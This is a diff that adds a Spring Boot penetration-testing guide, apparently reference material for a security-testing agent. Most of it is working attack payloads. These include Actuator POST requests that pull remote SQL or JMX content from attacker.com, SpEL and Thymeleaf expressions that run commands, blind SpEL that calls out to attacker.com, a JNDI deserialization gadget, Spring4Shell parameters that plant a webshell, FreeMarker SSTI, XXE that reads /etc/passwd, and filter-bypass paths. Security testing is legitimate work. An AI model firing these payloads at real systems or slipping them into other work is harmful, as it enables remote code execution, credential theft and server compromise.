@@ -1,0 +1,496 @@
+<spring_boot_security_guide>
+<title>SPRING BOOT SECURITY TESTING</title>
+
+<critical>Spring Boot is the dominant Java web framework. Its convention-over-configuration approach can hide security issues. Testing must focus on Actuator endpoint exposure, SpEL injection, mass assignment via data binding, template injection, and Spring Security misconfigurations.</critical>
+
+<scope>
+- Actuator endpoint exposure
+- Spring Expression Language (SpEL) injection
+- Mass assignment via data binding
+- Thymeleaf and other template injection
+- Spring Security bypass
+- Error page information disclosure
+- Deserialization vulnerabilities
+- Authentication and authorization flaws
+</scope>
+
+<methodology>
+1. Discover Actuator endpoints and assess exposure.
+2. Test for SpEL injection in dynamic expressions.
+3. Probe data binding for mass assignment vulnerabilities.
+4. Examine template rendering for injection opportunities.
+5. Test Spring Security filters for bypass conditions.
+</methodology>
+
+<actuator_endpoints>
+<endpoint_discovery>
+{% raw %}
+# Spring Boot Actuator endpoints (default base path)
+/actuator
+/actuator/health
+/actuator/info
+/actuator/env
+/actuator/beans
+/actuator/configprops
+/actuator/mappings
+/actuator/metrics
+/actuator/trace
+/actuator/httptrace
+/actuator/heapdump
+/actuator/threaddump
+/actuator/loggers
+/actuator/shutdown
+/actuator/jolokia
+/actuator/gateway/routes
+
+# Legacy paths (Spring Boot 1.x)
+/health
+/info
+/env
+/beans
+/configprops
+/mappings
+/metrics
+/trace
+/heapdump
+/dump
+/loggers
+/shutdown
+/jolokia
+
+# Alternative base paths
+/manage/actuator/
+/admin/actuator/
+/monitoring/
+{% endraw %}
+</endpoint_discovery>
+
+<sensitive_endpoints>
+{% raw %}
+# High-value Actuator endpoints:
+
+# /actuator/env - Environment variables and properties
+# May expose:
+# - Database credentials
+# - API keys
+# - Secrets
+# Properties masked as ****** but sometimes exposed
+
+# /actuator/heapdump - JVM heap dump
+# Contains:
+# - Passwords in memory
+# - Session tokens
+# - Encryption keys
+# Download and analyze with tools like VisualVM
+
+# /actuator/configprops - Configuration properties
+# Full configuration including sensitive values
+
+# /actuator/mappings - All URL mappings
+# Complete route enumeration
+
+# /actuator/beans - All Spring beans
+# Internal application structure
+
+# /actuator/trace or /actuator/httptrace - HTTP request traces
+# May contain auth tokens, cookies
+{% endraw %}
+</sensitive_endpoints>
+
+<actuator_exploitation>
+{% raw %}
+# Actuator RCE vectors:
+
+# 1. /actuator/env + /actuator/restart
+# Set properties via POST, restart to apply
+POST /actuator/env HTTP/1.1
+Content-Type: application/json
+
+{"name":"spring.datasource.url","value":"jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://attacker.com/evil.sql'"}
+
+POST /actuator/restart
+
+# 2. /actuator/jolokia - JMX over HTTP
+# Execute MBeans operations
+POST /actuator/jolokia
+Content-Type: application/json
+
+{
+  "type": "exec",
+  "mbean": "com.sun.management:type=DiagnosticCommand",
+  "operation": "compilerDirectivesAdd",
+  "arguments": ["http://attacker.com/evil.txt"]
+}
+
+# 3. /actuator/gateway/routes (Spring Cloud Gateway)
+# Add malicious routes
+POST /actuator/gateway/routes/evil HTTP/1.1
+Content-Type: application/json
+
+{
+  "id": "evil",
+  "predicates": [{"name": "Path", "args": {"_genkey_0": "/evil/**"}}],
+  "filters": [{"name": "RewritePath", "args": {"_genkey_0": "/evil/(?<path>.*)", "_genkey_1": "/${path}"}}],
+  "uri": "http://attacker.com"
+}
+
+POST /actuator/gateway/refresh
+{% endraw %}
+</actuator_exploitation>
+</actuator_endpoints>
+
+<spel_injection>
+<injection_points>
+{% raw %}
+# SpEL injection locations:
+
+# 1. @Value annotation with user input
+@Value("#{${userInput}}")
+
+# 2. Message expressions (Thymeleaf)
+${__${userInput}__}
+
+# 3. Spring Security expressions
+@PreAuthorize("#{userInput}")
+
+# 4. Query parameters in SpEL
+@Query("SELECT * FROM users WHERE #{#condition}")
+
+# 5. Error messages with SpEL
+{% endraw %}
+</injection_points>
+
+<spel_payloads>
+{% raw %}
+# SpEL RCE payloads:
+
+# Basic command execution
+${T(java.lang.Runtime).getRuntime().exec('id')}
+
+# ProcessBuilder
+${T(java.lang.ProcessBuilder).new({'cat','/etc/passwd'}).start()}
+
+# ScriptEngine
+${T(javax.script.ScriptEngineManager).new().getEngineByName('nashorn').eval('java.lang.Runtime.getRuntime().exec("id")')}
+
+# Full payload with output:
+${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).useDelimiter('\\A').next()}
+
+# URL-encoded for GET parameters:
+%24%7BT(java.lang.Runtime).getRuntime().exec('id')%7D
+
+# Thymeleaf SpEL injection:
+__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
+{% endraw %}
+</spel_payloads>
+
+<blind_spel>
+{% raw %}
+# Blind SpEL injection:
+
+# Time-based:
+${T(java.lang.Thread).sleep(5000)}
+
+# DNS-based:
+${T(java.net.InetAddress).getByName('attacker.com')}
+
+# HTTP-based:
+${T(java.net.URL).new('http://attacker.com').openConnection().getResponseCode()}
+{% endraw %}
+</blind_spel>
+</spel_injection>
+
+<mass_assignment>
+<data_binding_abuse>
+{% raw %}
+# Spring MVC data binding vulnerabilities:
+
+# Vulnerable controller:
+@PostMapping("/user")
+public String updateUser(@ModelAttribute User user) {...}
+
+# Attack - bind unexpected fields:
+POST /user HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+name=attacker&role=admin&isAdmin=true&password=newpass
+
+# Nested object binding:
+POST /user HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+profile.settings.admin=true&profile.permissions[0]=ALL
+{% endraw %}
+</data_binding_abuse>
+
+<class_loader_manipulation>
+{% raw %}
+# CVE-2022-22965 (Spring4Shell) style attacks:
+
+# Manipulate class loader through data binding:
+class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7bc2%7di...
+
+# Target Tomcat AccessLogValve:
+class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT
+class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell
+class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
+class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
+
+# Requires specific conditions:
+# - JDK 9+
+# - WAR deployment
+# - Specific Tomcat version
+{% endraw %}
+</class_loader_manipulation>
+
+<jackson_binding>
+{% raw %}
+# Jackson deserialization via data binding:
+
+# If @JsonTypeInfo used with untrusted input:
+{
+  "@class": "com.sun.rowset.JdbcRowSetImpl",
+  "dataSourceName": "ldap://attacker.com/evil",
+  "autoCommit": true
+}
+
+# Or property-based:
+{
+  "type": "com.sun.rowset.JdbcRowSetImpl",
+  "dataSourceName": "ldap://attacker.com/evil"
+}
+{% endraw %}
+</jackson_binding>
+</mass_assignment>
+
+<template_injection>
+<thymeleaf_ssti>
+{% raw %}
+# Thymeleaf Server-Side Template Injection:
+
+# Standard SpEL in Thymeleaf:
+__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
+
+# Fragment expression:
+~{::__${T(java.lang.Runtime).getRuntime().exec('id')}__}
+
+# In URL/path:
+/path?name=__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
+
+# Preprocessing:
+/doc/__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x.pdf
+
+# If return value used in template:
+@GetMapping("/{doc}")
+public String getDoc(@PathVariable String doc, Model model) {
+    return doc;  // SSTI if doc is template path
+}
+{% endraw %}
+</thymeleaf_ssti>
+
+<freemarker_ssti>
+{% raw %}
+# FreeMarker template injection:
+
+# Execute method:
+<#assign ex = "freemarker.template.utility.Execute"?new()>
+${ex("id")}
+
+# ObjectConstructor:
+<#assign oc = "freemarker.template.utility.ObjectConstructor"?new()>
+${oc("java.lang.ProcessBuilder", ["id"]).start()}
+
+# JythonRuntime (if available):
+<#assign jr = "freemarker.template.utility.JythonRuntime"?new()>
+{% endraw %}
+</freemarker_ssti>
+</template_injection>
+
+<spring_security>
+<security_bypass>
+{% raw %}
+# Spring Security filter bypass:
+
+# Path normalization differences:
+/admin/../user  # May bypass /admin/** rules
+/admin/;x=y     # Semicolon in path
+/admin%2f..%2fuser
+/Admin          # Case sensitivity
+
+# Method-based bypass:
+# If only GET is secured:
+POST /admin HTTP/1.1  # Different method
+OPTIONS /admin HTTP/1.1
+
+# Content-type bypass:
+# If security only checks certain content types
+Content-Type: application/xml  # Instead of JSON
+{% endraw %}
+</security_bypass>
+
+<authentication_bypass>
+{% raw %}
+# Authentication vulnerabilities:
+
+# Remember-me token manipulation:
+# If using default remember-me
+remember-me: username:expiry:signature
+
+# JWT issues (if using Spring Security JWT):
+# Algorithm confusion
+# Token validation bypass
+
+# OAuth2 misconfigurations:
+# Redirect URI manipulation
+# State parameter issues
+{% endraw %}
+</authentication_bypass>
+
+<authorization_bypass>
+{% raw %}
+# @PreAuthorize and @PostAuthorize bypass:
+
+# SpEL in security expressions:
+@PreAuthorize("hasRole(#role)")  # If role parameter controlled
+
+# Missing authorization:
+# Endpoints without security annotations
+
+# CORS + CSRF bypass:
+# Cross-origin requests with credentials
+{% endraw %}
+</authorization_bypass>
+</spring_security>
+
+<error_handling>
+<whitelabel_error>
+{% raw %}
+# Whitelabel error page information disclosure:
+
+# Trigger errors to get information:
+GET /error HTTP/1.1
+GET /invalid-path HTTP/1.1
+
+# Information leaked:
+# - Exception type
+# - Stack trace (if enabled)
+# - Application paths
+# - Framework version
+
+# Check server.error.include-stacktrace setting
+{% endraw %}
+</whitelabel_error>
+
+<custom_errors>
+{% raw %}
+# Custom error page vulnerabilities:
+
+# If error message is reflected:
+GET /api/users/"><script>alert(1)</script> HTTP/1.1
+
+# SSTI in error templates:
+# If error message is processed by template engine
+{% endraw %}
+</custom_errors>
+</error_handling>
+
+<deserialization>
+<java_deserialization>
+{% raw %}
+# Java deserialization in Spring:
+
+# Look for:
+# - ObjectInputStream usage
+# - RMI/JMX endpoints
+# - Custom serialization
+# - Session storage
+
+# Generate payloads with ysoserial:
+java -jar ysoserial.jar CommonsCollections6 'id' | base64
+
+# Common gadget chains:
+# - CommonsCollections (if commons-collections in classpath)
+# - Spring (if spring-beans in classpath)
+# - Hibernate (if hibernate in classpath)
+{% endraw %}
+</java_deserialization>
+
+<xml_deserialization>
+{% raw %}
+# XXE in Spring endpoints:
+
+# If XML parsing is enabled:
+POST /api/data HTTP/1.1
+Content-Type: application/xml
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<data>&xxe;</data>
+{% endraw %}
+</xml_deserialization>
+</deserialization>
+
+<common_payloads>
+{% raw %}
+# SpEL injection
+${T(java.lang.Runtime).getRuntime().exec('id')}
+#{T(java.lang.Runtime).getRuntime().exec('id')}
+
+# Thymeleaf SSTI
+__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
+
+# Mass assignment
+role=admin&isAdmin=true&active=true
+
+# Actuator endpoints
+/actuator/env
+/actuator/heapdump
+/actuator/jolokia
+
+# Path bypass
+/admin/../user
+/admin;/user
+/Admin
+{% endraw %}
+</common_payloads>
+
+<validation>
+1. Demonstrate Actuator endpoint exposure with sensitive data.
+2. Show SpEL injection leading to code execution.
+3. Prove mass assignment enabling privilege escalation.
+4. Document Spring Security bypass with evidence.
+5. Provide reproducible requests with exact payloads.
+</validation>
+
+<false_positives>
+- Actuator endpoints properly secured with authentication
+- SpEL evaluation disabled or restricted
+- Proper @InitBinder with allowed fields
+- Spring Security with correct path matching
+- Error pages without sensitive information
+</false_positives>
+
+<impact>
+- Remote code execution via SpEL injection
+- Data breach via Actuator endpoint exposure
+- Privilege escalation via mass assignment
+- Authentication bypass through security misconfiguration
+- Information disclosure via error pages
+- Server compromise via deserialization
+</impact>
+
+<pro_tips>
+1. Always enumerate /actuator/* endpoints first.
+2. Download /actuator/heapdump and search for secrets.
+3. Test SpEL injection in any user-controlled parameter.
+4. Check data binding with unexpected fields like role, admin.
+5. Test path variations for Spring Security bypass.
+6. Look for Thymeleaf templates with user input in paths.
+7. Check for XML endpoints with XXE.
+8. Test Jackson type handling if @JsonTypeInfo is used.
+9. Look for /jolokia for JMX-based RCE.
+10. Check Spring Cloud Gateway /actuator/gateway/routes.
+</pro_tips>
+
+<remember>Spring Boot's auto-configuration creates many default endpoints and behaviors. Actuator endpoints are the primary attack surface - they're often enabled by default and inadequately secured. SpEL injection is unique to Spring and provides direct code execution. Mass assignment via data binding is common because it's convenient for developers but dangerous without explicit allowed field lists.</remember>
+</spring_boot_security_guide>
